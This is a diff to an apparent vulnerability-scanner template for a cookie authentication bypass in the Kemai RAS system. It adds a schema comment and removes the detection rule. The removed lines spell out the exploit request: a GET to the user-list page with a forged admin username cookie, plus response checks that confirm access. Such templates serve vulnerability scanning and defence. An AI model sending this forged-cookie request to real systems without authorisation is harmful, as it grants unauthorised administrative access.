@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: maike-ras-cookie-bypass
 
 info:
@@ -9,13 +10,3 @@ info:
     app="科迈-RAS系统"
   reference:
     - http://wiki.peiqi.tech/wiki/webapp/%E7%A7%91%E8%BF%88/%E7%A7%91%E8%BF%88%20RAS%E7%B3%BB%E7%BB%9F%20Cookie%E9%AA%8C%E8%AF%81%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /Server/CmxUser.php?pgid=UserList
-      headers:
-        Cookie: RAS_Admin_UserInfo_UserName=admin
-    expression: response.status == 200 && response.body.bcontains(b'退出</A>') && response.body.bcontains(b'系统登录</A>') && response.body.bcontains(b'配置管理</A>')
-expression: r0()
